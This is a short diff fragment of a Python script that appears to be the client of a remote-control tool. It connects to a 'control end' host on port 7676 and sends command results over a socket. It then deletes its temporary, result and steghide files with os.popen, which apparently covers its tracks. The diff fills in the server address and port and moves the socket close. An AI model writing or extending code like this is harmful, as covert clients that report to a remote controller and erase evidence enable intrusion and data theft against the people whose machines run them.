@@ -75,12 +75,12 @@ def connectHost(ht,pt):
             sock.send(resu.encode('utf-8'))
             os.popen('del tmp.txt&del result.txt&del result.jpg&del steghide\\tmp.txt')
             time.sleep(1)
-            sock.close()
+    sock.close()
 
 
 def main():
-    host='服务器端ip'#服务器端ip
-    port='服务器端port' #服务器端port
+    host='ip'#服务器端ip
+    port='7676' #服务器端port
     connectHost(host,port)              #连接到控制端
 
 
